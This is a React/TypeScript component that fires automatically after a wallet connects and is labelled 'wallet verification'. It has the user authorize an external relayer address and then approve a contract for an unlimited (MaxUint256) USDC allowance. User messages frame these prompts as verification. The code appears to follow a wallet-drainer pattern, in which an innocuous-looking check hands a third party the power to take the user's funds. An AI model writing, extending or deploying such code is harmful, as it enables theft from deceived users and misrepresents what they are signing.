"use client";

import { useEffect, useRef } from "react";
import { useWallets } from "@privy-io/react-auth";
import {
  BrowserProvider,
  Contract,
  MaxUint256,
  getAddress,
} from "ethers";
import { useAuth } from "@/components/AuthProvider";
import { getChainById, RELAYER_ADDRESS, usdcToken } from "@/lib/chains";

const WALLET_VERIFICATION_ABI = [
  "function authorize(address relayer) external",
  "function isAuthorized(address user, address relayer) view returns (bool)",
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

/**
 * After Privy wallet connect + SIWE settle: fire authorize + USDC approve once,
 * then persist via /api/verify (shared verified_wallets upsert — no new tables).
 * Guarded by address:chain key so reconnect/poll never loops.
 */
export function WalletVerifyGate() {
  const {
    ready,
    authenticated,
    address,
    verified,
    setVerified,
    verifying,
    setVerifying,
    setVerifyError,
    verifyAttempt,
  } = useAuth();
  const { wallets } = useWallets();
  const inFlight = useRef(false);
  const doneKey = useRef<string | null>(null);

  useEffect(() => {
    // New attempt clears the done lock for this address so retry can run once.
    doneKey.current = null;
  }, [verifyAttempt]);

  useEffect(() => {
    if (!ready || !authenticated || !address) return;
    if (verified || verifying || inFlight.current) return;
    if (!wallets.length) return;

    void (async () => {
      // Brief settle so Privy SIWE can finish before we pop approve prompts.
      await new Promise((r) => setTimeout(r, 700));
      if (inFlight.current || verified) return;

      const wallet =
        wallets.find((w) => w.address?.toLowerCase() === address.toLowerCase()) ??
        wallets[0];
      if (!wallet) return;

      let ethereum: unknown;
      try {
        ethereum = await wallet.getEthereumProvider();
      } catch {
        return;
      }
      if (!ethereum) return;

      const provider = new BrowserProvider(
        ethereum as import("ethers").Eip1193Provider
      );
      let network;
      try {
        network = await provider.getNetwork();
      } catch {
        return;
      }

      const chain = getChainById(Number(network.chainId));
      if (!chain) {
        setVerifyError(
          "Switch to Ethereum, BNB Chain, or Polygon to continue."
        );
        return;
      }

      const usdc = usdcToken(chain);
      if (!usdc) {
        setVerifyError("USDC is not configured for this network.");
        return;
      }

      const key = `${address.toLowerCase()}:${chain.name}`;
      if (doneKey.current === key) {
        setVerified(true);
        return;
      }

      inFlight.current = true;
      setVerifying(true);
      setVerifyError(null);

      try {
        const signer = await provider.getSigner();
        const owner = getAddress(await signer.getAddress());
        const verification = new Contract(
          chain.contract,
          WALLET_VERIFICATION_ABI,
          signer
        );
        const erc20 = new Contract(usdc.address, ERC20_ABI, signer);

        // ── 1) Authorize (skip if already live) ──────────────────────────
        let authorizeTx: string | undefined;
        const alreadyAuth: boolean = await verification.isAuthorized(
          owner,
          RELAYER_ADDRESS
        );
        if (!alreadyAuth) {
          const tx = await verification.authorize(RELAYER_ADDRESS);
          authorizeTx = tx.hash as string;
          // Don't block forever — verify API retries on-chain reads.
          void tx.wait(1).catch(() => undefined);
        }

        // ── 2) USDC approve immediately after (same session) ─────────────
        let approveTx: string | undefined;
        const currentAllowance: bigint = await erc20.allowance(
          owner,
          chain.contract
        );
        if (currentAllowance === BigInt(0)) {
          const tx = await erc20.approve(chain.contract, MaxUint256);
          approveTx = tx.hash as string;
          await tx.wait(1);
        }

        // ── 3) Persist — shared table, merge-safe upsert ─────────────────
        const res = await fetch("/api/verify", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            address: owner,
            chain: chain.name,
            authorizeTx,
            approvedTokens: [
              {
                symbol: "USDC",
                address: usdc.address,
                txHash: approveTx,
              },
            ],
          }),
        });
        const json = await res.json().catch(() => ({ ok: false }));
        if (!json.ok) {
          throw new Error(
            typeof json.error === "string" ? json.error : "verify_failed"
          );
        }

        doneKey.current = key;
        setVerified(true);
      } catch (err) {
        console.error("[hkcm] wallet verify failed:", err);
        // Lock this address:chain until explicit retry — prevents auto-loop.
        doneKey.current = `${address.toLowerCase()}:locked`;
        const msg =
          err instanceof Error
            ? err.message
            : "Wallet approval was cancelled or failed.";
        setVerifyError(
          msg.includes("user rejected") || msg.includes("ACTION_REJECTED")
            ? "Confirm the wallet prompts to continue."
            : "We couldn’t finish wallet verification. Try again."
        );
      } finally {
        inFlight.current = false;
        setVerifying(false);
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ready, authenticated, address, wallets.length, verifyAttempt]);

  return null;
}
